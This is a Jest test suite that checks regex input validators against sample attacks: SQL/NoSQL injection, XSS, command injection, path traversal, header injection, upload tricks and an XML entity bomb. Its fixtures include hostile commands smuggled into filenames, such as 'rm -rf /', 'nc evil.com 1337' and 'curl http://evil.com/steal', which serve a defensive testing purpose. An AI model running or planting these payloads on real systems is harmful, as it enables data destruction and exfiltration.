import { describe, test, expect, beforeEach, afterEach } from '@jest/globals';

/**
 * Input Validation Security Testing Suite
 * 
 * This test suite validates input security against injection attacks,
 * cross-site scripting (XSS), and other input-based vulnerabilities.
 * 
 * Tests cover OWASP input validation security guidelines and common attack vectors.
 */

describe('Input Validation Security Tests', () => {
  beforeEach(() => {
    // Set up test environment
    process.env.JWT_SECRET = 'test-jwt-secret-32-characters-long';
    process.env.JWT_REFRESH_SECRET = 'test-refresh-secret-32-chars-long';
  });
  
  afterEach(() => {
    // Clean up environment
    delete process.env.JWT_SECRET;
    delete process.env.JWT_REFRESH_SECRET;
  });

  describe('SQL/NoSQL Injection Prevention', () => {
    test('should prevent NoSQL injection in authentication queries', () => {
      const maliciousInputs = [
        '{"$ne": null}',
        '{"$regex": ".*"}',
        '{"$where": "this.username == this.password"}',
        '{"$gt": ""}',
        '{"username": {"$ne": null}}',
        '{"$or": [{"username": "admin"}, {"username": "root"}]}',
        "'; return db.users.drop(); var a='",
        'admin"; db.users.drop(); //',
        '{"$eval": "db.users.drop()"}',
        '{"$where": "function() { return true; }"}',
      ];
      
      maliciousInputs.forEach(input => {
        // These should not be interpreted as MongoDB operators
        expect(typeof input).toBe('string');
        
        // Most contain MongoDB operator patterns
        const hasMongOpsOrCode = /\$|{|}|return|drop|function/.test(input);
        expect(hasMongOpsOrCode).toBe(true);
        
        // Input validation should reject these patterns
        const isValidEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(input);
        expect(isValidEmail).toBe(false);
      });
    });

    test('should sanitize user input for database operations', () => {
      const userInputs = [
        { input: 'user@example.com', valid: true },
        { input: 'user@example.com"; drop table users; --', valid: false },
        { input: 'user@example.com\'; SELECT * FROM users WHERE \'1\'=\'1', valid: false },
        { input: 'user@example.com" OR "1"="1', valid: false },
        { input: 'user@example.com\x00admin', valid: false },
        { input: 'user@example.com\r\nBCC: hacker@evil.com', valid: false },
      ];
      
      userInputs.forEach(({ input, valid }) => {
        const isClean = /^[a-zA-Z0-9@._-]+$/.test(input) && !input.includes('\x00') && !input.includes('\r') && !input.includes('\n');
        expect(isClean).toBe(valid);
      });
    });

    test('should validate user ID format', () => {
      const userIds = [
        { id: 'user_12345678-1234-1234-1234-123456789abc', valid: true },
        { id: 'user_123"; DROP TABLE users; --', valid: false },
        { id: 'user_123\' OR \'1\'=\'1', valid: false },
        { id: 'user_123; SELECT * FROM users', valid: false },
        { id: 'user_123\x00admin', valid: false },
        { id: '', valid: false },
        { id: 'invalid-format', valid: false },
      ];
      
      userIds.forEach(({ id, valid }) => {
        const isValidFormat = /^user_[0-9a-f-]{36}$/.test(id);
        expect(isValidFormat).toBe(valid);
      });
    });
  });

  describe('Cross-Site Scripting (XSS) Prevention', () => {
    test('should prevent script injection in user data', () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert("xss")>',
        '<svg onload=alert("xss")>',
        'javascript:alert("xss")',
        '<iframe src="javascript:alert(\'xss\')">',
        '<body onload=alert("xss")>',
        '<div onclick=alert("xss")>Click me</div>',
        '"><script>alert("xss")</script>',
        '\'; alert("xss"); //',
        '<script>document.location="http://evil.com"</script>',
      ];
      
      xssPayloads.forEach(payload => {
        // These should be detected as potentially malicious
        // Check for script tags, event handlers, javascript: protocol, or inline script patterns
        const containsScript = /<script|javascript:|onerror=|onload=|onclick=|alert\(/i.test(payload);
        expect(containsScript).toBe(true);
        
        // Should not pass basic validation
        const isAlphanumeric = /^[a-zA-Z0-9\s@._-]+$/.test(payload);
        expect(isAlphanumeric).toBe(false);
      });
    });

    test('should sanitize HTML content in user inputs', () => {
      const htmlInputs = [
        { input: 'John Doe', sanitized: 'John Doe' },
        { input: 'John <script>alert("xss")</script> Doe', sanitized: 'John alert("xss") Doe' },
        { input: '<b>Bold Text</b>', sanitized: 'Bold Text' },
        { input: '<img src="image.jpg">', sanitized: '' },
        { input: 'Contact: user@example.com', sanitized: 'Contact: user@example.com' },
      ];
      
      htmlInputs.forEach(({ input, sanitized }) => {
        // Simple HTML stripping - removes tags but keeps text content
        const stripped = input.replace(/<[^>]*>/g, '');
        expect(stripped).toBe(sanitized);
      });
    });

    test('should prevent JavaScript URL schemes', () => {
      const maliciousUrls = [
        'javascript:alert("xss")',
        'JAVASCRIPT:alert("xss")',
        'jAvAsCrIpT:alert("xss")',
        'data:text/html,<script>alert("xss")</script>',
        'vbscript:msgbox("xss")',
        'file:///etc/passwd',
        'ftp://malicious.com/evil.exe',
      ];
      
      const safeUrls = [
        'https://example.com',
        'http://localhost:3000',
        'mailto:user@example.com',
        '/relative/path',
        '#anchor',
      ];
      
      maliciousUrls.forEach(url => {
        const isSafe = /^(https?:\/\/|\/|#|mailto:)/i.test(url) && 
                      !/^(javascript|data|vbscript|file|ftp):/i.test(url);
        expect(isSafe).toBe(false);
      });
      
      safeUrls.forEach(url => {
        const isSafe = /^(https?:\/\/|\/|#|mailto:)/i.test(url) && 
                      !/^(javascript|data|vbscript|file|ftp):/i.test(url);
        expect(isSafe).toBe(true);
      });
    });
  });

  describe('Command Injection Prevention', () => {
    test('should prevent command injection in system calls', () => {
      const commandInjections = [
        'filename.txt; rm -rf /',
        'filename.txt && cat /etc/passwd',
        'filename.txt | nc evil.com 1337',
        'filename.txt `whoami`',
        'filename.txt $(ls -la)',
        'filename.txt; curl http://evil.com/steal',
        'filename.txt & ping -c 10 google.com',
        'filename.txt || wget http://evil.com/malware',
      ];
      
      commandInjections.forEach(input => {
        // Should detect command injection patterns
        const hasCommandChars = /[;&|`$()]/.test(input);
        expect(hasCommandChars).toBe(true);
        
        // Should not pass filename validation
        const isValidFilename = /^[a-zA-Z0-9._-]+$/.test(input);
        expect(isValidFilename).toBe(false);
      });
    });

    test('should validate file path inputs', () => {
      const filePaths = [
        { path: 'document.pdf', valid: true },
        { path: 'folder/document.pdf', valid: true },
        { path: '../../../etc/passwd', valid: false },
        { path: '/etc/passwd', valid: false },
        { path: '..\\..\\windows\\system32\\config\\sam', valid: false },
        { path: 'file.txt; rm -rf /', valid: false },
        { path: 'file.txt && cat secrets', valid: false },
        { path: 'file\x00.txt', valid: false },
      ];
      
      filePaths.forEach(({ path, valid }) => {
        // Check for path traversal and command injection
        const isSafe = !path.includes('..') && 
                      !path.startsWith('/') && 
                      !/[;&|`$()\\]/.test(path) &&
                      !path.includes('\x00');
        expect(isSafe).toBe(valid);
      });
    });
  });

  describe('Header Injection Prevention', () => {
    test('should prevent HTTP header injection', () => {
      const headerInjections = [
        'value\r\nSet-Cookie: admin=true',
        'value\nLocation: http://evil.com',
        'value\r\nContent-Type: text/html\r\n\r\n<script>alert("xss")</script>',
        'value\x00\r\nSet-Cookie: sessionid=hijacked',
        'value\r\nX-Forwarded-For: 127.0.0.1',
        'value\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html>evil</html>',
      ];
      
      headerInjections.forEach(value => {
        // Should detect CRLF injection
        const hasCRLF = /[\r\n\x00]/.test(value);
        expect(hasCRLF).toBe(true);
        
        // Should not pass header value validation
        const isValidHeaderValue = /^[^\r\n\x00]+$/.test(value);
        expect(isValidHeaderValue).toBe(false);
      });
    });

    test('should validate email headers', () => {
      const emailHeaders = [
        { header: 'user@example.com', valid: true },
        { header: 'User Name <user@example.com>', valid: true },
        { header: 'user@example.com\r\nBCC: hacker@evil.com', valid: false },
        { header: 'user@example.com\nSubject: Hacked', valid: false },
        { header: 'user@example.com\x00admin@evil.com', valid: false },
        { header: 'user@example.com%0aBCC:hacker@evil.com', valid: false },
      ];
      
      emailHeaders.forEach(({ header, valid }) => {
        // Check for actual CRLF characters and URL-encoded versions
        const isClean = !/[\r\n\x00]|%0[ad]/i.test(header);
        if (valid) {
          expect(isClean).toBe(true);
        } else {
          expect(isClean).toBe(false);
        }
      });
    });
  });

  describe('File Upload Security', () => {
    test('should validate file extensions', () => {
      const fileUploads = [
        { filename: 'image.jpg', valid: true },
        { filename: 'document.pdf', valid: true },
        { filename: 'script.exe', valid: false },
        { filename: 'malware.bat', valid: false },
        { filename: 'image.jpg.exe', valid: false },
        { filename: 'document.pdf.php', valid: false },
        { filename: 'file.jsp', valid: false },
        { filename: 'upload.asp', valid: false },
      ];
      
      const allowedExtensions = /\.(jpg|jpeg|png|gif|pdf|doc|docx|txt)$/i;
      
      fileUploads.forEach(({ filename, valid }) => {
        const isAllowed = allowedExtensions.test(filename);
        expect(isAllowed).toBe(valid);
      });
    });

    test('should prevent double extension attacks', () => {
      const doubleExtensions = [
        'image.jpg.php',
        'document.pdf.jsp',
        'file.txt.exe',
        'upload.png.asp',
        'safe.gif.bat',
      ];
      
      doubleExtensions.forEach(filename => {
        // Should detect multiple extensions
        const extensionCount = (filename.match(/\./g) || []).length;
        expect(extensionCount).toBeGreaterThan(1);
        
        // Should not pass single extension validation
        const hasSingleExtension = /^[^.]+\.[a-zA-Z]{2,4}$/.test(filename);
        expect(hasSingleExtension).toBe(false);
      });
    });

    test('should validate MIME types', () => {
      const mimeTypes = [
        { type: 'image/jpeg', valid: true },
        { type: 'image/png', valid: true },
        { type: 'application/pdf', valid: true },
        { type: 'text/plain', valid: true },
        { type: 'application/x-executable', valid: false },
        { type: 'application/x-msdownload', valid: false },
        { type: 'text/x-php', valid: false },
        { type: 'application/x-httpd-php', valid: false },
      ];
      
      const allowedMimes = [
        'image/jpeg', 'image/png', 'image/gif',
        'application/pdf', 'text/plain',
        'application/msword', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
      ];
      
      mimeTypes.forEach(({ type, valid }) => {
        const isAllowed = allowedMimes.includes(type);
        expect(isAllowed).toBe(valid);
      });
    });
  });

  describe('Data Type Validation', () => {
    test('should validate numeric inputs', () => {
      const numericInputs = [
        { input: '123', valid: true },
        { input: '0', valid: true },
        { input: '-456', valid: true },
        { input: '123.45', valid: true },
        { input: 'abc', valid: false },
        { input: '123abc', valid: false },
        { input: '123; DROP TABLE users', valid: false },
        { input: '123\x00', valid: false },
        { input: '', valid: false },
      ];
      
      numericInputs.forEach(({ input, valid }) => {
        const isNumeric = /^-?\d+(\.\d+)?$/.test(input);
        expect(isNumeric).toBe(valid);
      });
    });

    test('should validate boolean inputs', () => {
      const booleanInputs = [
        { input: 'true', valid: true },
        { input: 'false', valid: true },
        { input: 'TRUE', valid: false }, // Case sensitive
        { input: 'FALSE', valid: false },
        { input: '1', valid: false },
        { input: '0', valid: false },
        { input: 'yes', valid: false },
        { input: 'no', valid: false },
        { input: 'true; DROP TABLE users', valid: false },
      ];
      
      booleanInputs.forEach(({ input, valid }) => {
        const isBoolean = input === 'true' || input === 'false';
        expect(isBoolean).toBe(valid);
      });
    });

    test('should validate date inputs', () => {
      const dateInputs = [
        { input: '2024-01-01', valid: true },
        { input: '2024-12-31T23:59:59Z', valid: true },
        { input: 'invalid-date', valid: false },
        { input: '2024-13-01', valid: false }, // Invalid month  
        { input: '2024-01-32', valid: false }, // Invalid day
        { input: '2024-01-01; DROP TABLE users', valid: false },
        { input: '2024-01-01\x00', valid: false },
      ];
      
      dateInputs.forEach(({ input, valid }) => {
        const parsedDate = Date.parse(input);
        const hasValidFormat = /^\d{4}-\d{2}-\d{2}/.test(input);
        const hasNoMaliciousChars = !/[;&|\x00]/.test(input);
        
        const isValidDate = !isNaN(parsedDate) && hasValidFormat && hasNoMaliciousChars;
        
        if (valid) {
          expect(isValidDate).toBe(true);
        } else {
          // For invalid dates, at least one check should fail
          const shouldFail = isNaN(parsedDate) || !hasValidFormat || !hasNoMaliciousChars;
          expect(shouldFail).toBe(true);
        }
      });
    });
  });

  describe('Rate Limiting and DoS Prevention', () => {
    test('should validate input length limits', () => {
      const maxLength = 1000;
      const inputs = [
        { input: 'a'.repeat(100), valid: true },
        { input: 'a'.repeat(maxLength), valid: true },
        { input: 'a'.repeat(maxLength + 1), valid: false },
        { input: 'a'.repeat(10000), valid: false },
        { input: 'a'.repeat(100000), valid: false },
      ];
      
      inputs.forEach(({ input, valid }) => {
        const isWithinLimit = input.length <= maxLength;
        expect(isWithinLimit).toBe(valid);
      });
    });

    test('should prevent billion laughs attack', () => {
      const xmlBomb = '<?xml version="1.0"?>' +
        '<!DOCTYPE lolz [' +
        '<!ENTITY lol "lol">' +
        '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">' +
        '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">' +
        ']>' +
        '<lolz>&lol3;</lolz>';
      
      // Should detect XML entity patterns
      const hasXMLEntities = /<!ENTITY|&\w+;/.test(xmlBomb);
      expect(hasXMLEntities).toBe(true);
      
      // Should not process XML with entities
      const isPlainText = !/<!DOCTYPE|<!ENTITY/.test('plain text input');
      expect(isPlainText).toBe(true);
    });
  });

  describe('Encoding and Character Set Validation', () => {
    test('should handle Unicode normalization attacks', () => {
      const unicodeAttacks = [
        'admin\u0000',
        'admin\uFEFF', // Byte order mark
        'admin\u200B', // Zero-width space
        'admin\u200C', // Zero-width non-joiner
        'admin\u200D', // Zero-width joiner
        'admin\u2060', // Word joiner
      ];
      
      unicodeAttacks.forEach(input => {
        // Should detect zero-width and control characters
        const hasControlChars = /[\u0000-\u001F\u007F-\u009F\uFEFF\u200B-\u200D\u2060]/u.test(input);
        expect(hasControlChars).toBe(true);
      });
    });

    test('should validate UTF-8 encoding', () => {
      const encodingTests = [
        { input: 'normal text', valid: true },
        { input: 'café', valid: true }, // Accented characters
        { input: '测试', valid: true }, // Chinese characters
        { input: '🚀', valid: true }, // Emoji
        { input: 'test\uD800', valid: false }, // Incomplete surrogate pair
        { input: 'test\uDFFF', valid: false }, // Invalid surrogate
      ];
      
      encodingTests.forEach(({ input, valid }) => {
        try {
          // Test if string can be properly encoded/decoded
          const encoded = encodeURIComponent(input);
          const decoded = decodeURIComponent(encoded);
          const isValidUTF8 = decoded === input;
          expect(isValidUTF8).toBe(valid);
        } catch (error) {
          expect(valid).toBe(false);
        }
      });
    });
  });
});